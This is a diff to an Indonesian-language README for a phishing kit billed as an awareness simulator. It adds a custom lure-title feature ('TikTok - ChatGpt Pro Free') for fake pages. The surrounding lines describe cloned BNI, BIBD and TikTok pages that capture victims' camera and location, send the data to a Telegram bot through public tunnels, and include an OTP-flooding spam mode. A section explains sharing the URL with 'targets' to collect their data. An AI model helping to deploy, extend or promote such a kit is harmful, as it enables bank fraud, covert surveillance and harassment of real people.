@@ -10,7 +10,8 @@
 
 Platform simulasi phishing dan social engineering awareness multi-template.
 
-**Multi Template:** BNI / TikTok / BIBD / OTP Flood
+**Multi Template:** BNI / TikTok / BIBD / OTP Flood  
+**Fitur Baru:** TikTok Custom Title — ganti title URL sesuai keinginan
 **Teknologi:** Cloudflare Tunnel / Telegram / Next.js
 
 > [!WARNING]
@@ -25,6 +26,7 @@ Platform simulasi phishing dan social engineering awareness multi-template.
 ## Fitur
 
 - **Multi-template system** — BNI, TikTok, BIBD, OTP Flood
+- **TikTok Custom Title** — ganti title URL bebas (ditanya tiap pilih template TikTok)
 - **One-click deploy** — Build Next.js + Cloudflare Tunnel / ngrok
 - **Auto URL update** — metadataBase otomatis mengikuti tunnel URL
 - **Camera & Location capture** — pengumpulan data berbasis permission
@@ -98,6 +100,18 @@ Saat pertama kali run, pilih template:
   Pilih template (1-4):
 ```
 
+**Jika pilih TikTok**, akan muncul prompt title URL:
+
+```
+  Template TikTok - Masukkan Title URL kamu
+  Contoh: TikTok - ChatGpt Pro Free
+  atau biarkan kosong untuk default: TikTok - ChatGpt Pro Free
+
+  Title URL:
+```
+
+Title ini akan otomatis dipakai di **Page Title, OpenGraph, Twitter Card,** dan semua metadata halaman. Biarkan kosong untuk pakai default.
+
 Sistem akan otomatis:
 
 1. Apply template files
@@ -142,6 +156,8 @@ Sistem akan otomatis:
   Pilih menu (1-6):
 ```
 
+Menu **[5] Ganti Template** juga akan meminta custom title jika switch ke TikTok.
+
 ### Mendapatkan Data Target
 
 1. Bagikan **PUBLIC URL** ke target
@@ -160,7 +176,7 @@ Sistem akan otomatis:
 | # | Template | Deskripsi | Mode |
 |---|----------|-----------|------|
 | 1 | BNI | Transfer Bank Verification | Web |
-| 2 | TikTok | Video Share Link (kamera + lokasi) | Web |
+| 2 | TikTok | Video Share Link (kamera + lokasi) **+ Custom Title** | Web |
 | 3 | BIBD | Bank Islam Brunei Darussalam | Web |
 | 4 | OTP Flood | Spam OTP multi-brand (Paypal, Tinder, Telegram, Flip, Lazada, Netflix, dll) | CLI |
 
@@ -252,6 +268,9 @@ A: Data dikirim langsung ke bot Telegram Anda. **TIDAK** disimpan di server kami
 
 **Q: Bisa running 24/7?**
 A: Cloudflare Tunnel gratis tidak menjamin uptime 100%. Untuk production, gunakan VPS + domain sendiri.
+
+**Q: Bisa custom title TikTok?**
+A: Ya! Setiap pilih template TikTok (di awal atau via menu [5]), kamu akan diminta input title URL. Title ini otomatis mengganti metadata page title, OpenGraph, dan Twitter Card.
 
 **Q: Bisa custom template?**
 A: Ya! Buat folder baru di `templates/<nama>` dengan `page.tsx`, `layout.tsx`, dan assets di `public/`.
